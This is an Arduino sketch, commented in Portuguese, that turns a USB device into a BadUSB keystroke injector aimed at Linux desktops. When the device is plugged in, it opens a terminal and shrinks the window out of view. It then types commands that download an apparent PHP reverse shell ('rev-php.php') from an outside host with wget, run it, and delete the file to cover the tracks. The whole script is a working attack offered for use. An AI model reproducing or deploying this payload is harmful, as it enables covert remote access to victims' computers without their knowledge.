#include <Keyboard.h>

// Função para pressionar combinações de teclas
void pressCombination(uint8_t key1, uint8_t key2, uint8_t key3) {
    Keyboard.press(key1); // Primeira tecla
    Keyboard.press(key2); // Segunda tecla
    if (key3) {
        Keyboard.press(key3); // Terceira tecla, se houver
    }
    delay(50);           // Pequeno delay para garantir o envio
    Keyboard.releaseAll();
    delay(200);          // Pausa curta entre combinações
}

// Função para digitar uma string rapidamente
void typeString(const char* text) {
    Keyboard.print(text); // Envia o texto diretamente
    delay(200);           // Pequena pausa após o texto
}

// Script principal
void executeScript() {
    delay(2000); // Aguarda antes de começar

    // Abrir o terminal (Ctrl + Alt + T)
    pressCombination(KEY_LEFT_CTRL, KEY_LEFT_ALT, 't');
    delay(1000); // Aguarda o terminal abrir

    // Comando para trocar o teclado para layout americano
    typeString("setxkbmap us\n");

    // Comando para reduzir a tela do terminal ao maximo
    typeString("printf '\e[8;1;1t' && printf '\e[3;1920;1080t'");

    // Baixar o arquivo para /tmp
    typeString("wget -O /tmp/rev-php.php https://zer0.pw/rev-php.php\n");

    // Executar o arquivo baixado
    typeString("php /tmp/rev-php.php\n");

    // Excluir o arquivo após execução
    typeString("rm /tmp/rev-php.php\n");

    // Retornar o teclado para ABNT2
    typeString("setxkbmap br\n");

    // Fechar o terminal
    typeString("exit\n");
}

void setup() {
    Keyboard.begin();
    executeScript(); // Executa o script
}

void loop() {
    // Nada no loop
}
